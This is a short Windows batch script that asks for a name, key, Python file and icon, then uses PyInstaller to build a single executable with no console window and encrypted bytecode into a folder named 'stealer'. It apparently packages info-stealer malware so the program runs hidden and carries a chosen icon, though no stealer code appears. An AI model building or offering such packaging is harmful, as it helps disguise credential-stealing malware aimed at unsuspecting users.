@echo off
cls
color d
title lol dane e sus
set /p "name= > Enter the name of the exe : "
set /p "key= > Enter the key : "
set /p "file= > Enter py file name : "
set /p "icon= > Enter icon : "
pyinstaller --onefile --noconsole --key "%key%" --distpath stealer/ --name "%name%" --icon %icon% "%file%.py"
title sus - done
echo Done